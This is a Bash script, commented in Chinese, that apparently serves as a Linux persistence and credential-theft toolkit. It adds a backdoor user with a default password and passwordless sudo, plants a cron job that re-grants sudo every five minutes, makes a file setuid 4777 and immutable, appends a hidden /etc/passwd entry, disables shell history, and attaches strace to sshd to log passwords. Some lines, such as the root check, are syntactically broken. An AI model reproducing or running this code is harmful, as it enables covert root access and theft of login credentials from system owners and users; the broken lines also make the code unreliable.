#!/bin/bash

# 确保脚本以 root 身份运行
if [ "$(id -u)" -ne 0; then
  echo "This script must be run as root" >&2
  exit 1
fi

# 添加用户到 sudoers 文件
add_user_to_sudoers() {
  local username="$1"
  if ! id -u "$username" >/dev/null 2>&1; then
    echo "User $username does not exist. Creating user..."
    useradd -m -s /bin/bash "$username"
    echo "$username:password" | chpasswd  # 设置默认密码
  fi

  if ! grep -q "^$username" /etc/sudoers; then
    echo "$username ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
    echo "User $username added to sudoers."
  else
    echo "User $username already in sudoers."
  fi
}

# 设置 cron 任务以维持权限
set_cron_job() {
  local username="$1"
  crontab -l -u "$username" 2>/dev/null | { cat; echo "*/5 * * * * /bin/bash -c 'echo $username ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers'"; } | crontab -u "$username" -
  echo "Cron job set for user $username to maintain sudo privileges."
}

# 修改文件权限和属性
modify_file_permissions_and_attributes() {
  local filepath="$1"
  chmod 4777 "$filepath"
  chattr +i "$filepath"
  echo "Permissions and attributes for $filepath set to 4777 and immutable."
}

# 设置隐身登录
set_invisible_login() {
  local username="$1"
  if ! grep -q "^$username" /etc/passwd; then
    echo "$username:x:$(id -u):$(id -g)::/dev/null:/bin/false" >> /etc/passwd
    echo "Invisible login set for user $username."
  else
    echo "User $username already has invisible login settings."
  fi
}

# 隐藏历史操作命令
hide_history() {
  echo 'export HISTFILE=/dev/null' >> ~/.bashrc
  echo 'export HISTSIZE=0' >> ~/.bashrc
  echo 'export HISTFILESIZE=0' >> ~/.bashrc
  source ~/.bashrc
  echo "History commands will be hidden."
}

# 使用 strace 记录密码
record_password_with_strace() {
  local log_file="/var/log/strace_log"
  pkill -f "strace -o $log_file -e trace=read"
  strace -o "$log_file" -e trace=read -p $(pgrep sshd) &
  echo "strace is running to record passwords to $log_file."
}

# 主函数
main() {
  local username="persistentuser"  # 需要添加的用户名
  local filepath="/path/to/important/file"  # 需要修改权限的文件路径

  add_user_to_sudoers "$username"
  set_cron_job "$username"
  modify_file_permissions_and_attributes "$filepath"
  set_invisible_login "$username"
  hide_history
  record_password_with_strace
}

# 执行主函数
main
